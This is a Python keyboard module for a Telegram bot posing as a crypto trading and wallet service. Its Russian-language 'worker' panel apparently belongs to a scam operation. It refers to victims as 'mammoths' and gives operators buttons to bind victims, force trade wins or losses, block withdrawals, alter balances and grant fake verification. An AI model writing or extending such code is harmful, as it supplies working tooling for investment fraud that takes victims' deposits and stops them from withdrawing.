from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
import config
from database.models import User


def get_main_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['main_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['trade'], callback_data='trade'))
    kb.row(InlineKeyboardButton(text=lang_data['wallet'], callback_data='wallet'))
    kb.row(InlineKeyboardButton(text=lang_data['change_lang'], callback_data='change_lang'),
           InlineKeyboardButton(text=lang_data['change_currency'], 
                                callback_data='change_currency'))
    kb.row(InlineKeyboardButton(text=lang_data['support'], callback_data='support'))
    return kb.as_markup()

def get_trade_kb(kb_lang_data: dict, user_tg_id: str) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['trade_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text='FAQ', callback_data='trade_faq'))
    kb.row(InlineKeyboardButton(text=lang_data['crypto'], 
           web_app=WebAppInfo(
#                url=f"{config.WEBHOOK_URL}:{config.WEBHOOK_PORT}/?\
# trade=BINANCE:BTCUSDT&id={user_tg_id}"
url='https://26992b44-696a-49cb-9850-9db0e8f9c850.tunnel4.com/?trade=BINANCE:BTCUSDT&id=123'
)))
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()

def get_wallet_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['wallet_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['top_up'], callback_data='top_up'))
    kb.row(InlineKeyboardButton(text=lang_data['withdraw'], callback_data='withdraw'))
    kb.row(InlineKeyboardButton(text=lang_data['promocode'], callback_data='promocode'))
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()

def get_top_up_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['top_up_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['card'], callback_data='card'))
    kb.row(InlineKeyboardButton(text=lang_data['crypto'], callback_data='crypto'))
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()

def get_select_crypto_currency_kb(kb_lang_data: dict = None) -> InlineKeyboardMarkup:
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text='BTC', callback_data='crypto_currency_btc'))
    kb.row(InlineKeyboardButton(text='ETH', callback_data='crypto_currency_eth'))
    kb.row(InlineKeyboardButton(text='USDT[TRC-20]', callback_data='crypto_currency_usdt'))
    return kb.as_markup()

def get_support_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['support_kb']

    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['check_payment'],
                                 callback_data='check_payment'))
    kb.row(InlineKeyboardButton(text=lang_data['support'], callback_data='support'))
    return kb.as_markup()

def get_back_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['back_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()


def get_select_lang_kb(kb_lang_data: dict = None) -> InlineKeyboardMarkup:
    kb_lang_data = kb_lang_data['buttons']['select_lang_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text='Русский', callback_data='set_lang_ru'),
           InlineKeyboardButton(text='English', callback_data='set_lang_en'))
    kb.row(InlineKeyboardButton(text='Польский', callback_data='set_lang_pl'),
           InlineKeyboardButton(text='Украинский', callback_data='set_lang_ua'))
    kb.row(InlineKeyboardButton(text=kb_lang_data['back'], callback_data='back'))
    return kb.as_markup()


def get_select_currency_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['select_currency_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text='USD', callback_data='set_currency_usd'),
           InlineKeyboardButton(text='EUR', callback_data='set_currency_eur'))
    kb.row(InlineKeyboardButton(text='RUB', callback_data='set_currency_rub'),
           InlineKeyboardButton(text='UAH', callback_data='set_currency_uah'))
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()


def get_support_page_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
    lang_data = kb_lang_data['buttons']['support_page_kb']
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text=lang_data['support'], url='https://google.com/'))
    kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
    return kb.as_markup()


###
# Worker keyboards
###

def get_main_worker_kb():
    kb = InlineKeyboardBuilder()
    kb.button(text='Список пользователей', callback_data='worker_list')
    kb.button(text='Рассылка', callback_data='worker_mailing')
    kb.button(text='Привязать мамонта', callback_data='worker_bind')
    kb.button(text='Мин.пополнение всем', callback_data='worker_min_deposit')
    kb.button(text='Промокод', callback_data='worker_promocode')
    kb.button(text='Задать валюту', callback_data='worker_set_currency')
    kb.button(text='Мин.вывод', callback_data='worker_min_withdraw')
    kb.button(text='Удалить всех', callback_data='worker_delete_all')
    kb.adjust(1)
    return kb.as_markup()

def get_select_user_kb(users: list[User]):
    kb = InlineKeyboardBuilder()
    for user in users:
        kb.button(text=user.tg_id, callback_data=f'worker_user_{user.tg_id}')
    kb.button(text='Поиск', callback_data='worker_search')
    kb.button(text='Назад', callback_data='worker_back')
    kb.adjust(1)
    return kb.as_markup()

def get_user_managment_kb(user_id: str):
    builder = InlineKeyboardBuilder()
    builder.button(text='Обновить', callback_data=f'worker_user_{user_id}')
    builder.button(text='Выигрыш', callback_data=f'worker_win_{user_id}')
    builder.button(text='Прогрыш', callback_data=f'worker_lose_{user_id}')
    builder.button(text='Рандом', callback_data=f'worker_random_{user_id}')
    builder.button(text='Выдать верификацию', callback_data=f'worker_verif_{user_id}')
    builder.button(text='Блокировать торги', callback_data=f'worker_block_{user_id}')
    builder.button(text='Блокировать вывод', callback_data=f'worker_block_withdraw_{user_id}')
    builder.button(text='Изменить баланс', callback_data=f'worker_change_balance_{user_id}')
    builder.button(text='Добавить к балансу', callback_data=f'worker_add_balance_{user_id}')
    builder.button(text='Максимальный баланс', callback_data=f'worker_max_balance_{user_id}')
    builder.button(text='Минимальное пополнение', callback_data=f'worker_min_deposit_{user_id}')
    builder.button(text='Написать', callback_data=f'worker_send_message_{user_id}')
    builder.button(text='Мин.вывод', callback_data=f'worker_min_withdraw_{user_id}')
    builder.button(text='Удалить мамонта', callback_data=f'worker_unbind_{user_id}')
    builder.button(text='Заблокировать', callback_data=f'worker_block_{user_id}')
    builder.button(text='Назад', callback_data='worker_back')
    builder.adjust(1, 3, 1, 2, 2, 2, 1)
    return builder.as_markup()


def get_worker_menu_back_kb():
    kb = InlineKeyboardBuilder()
    kb.button(text='Назад', callback_data='worker_back')
    return kb.as_markup()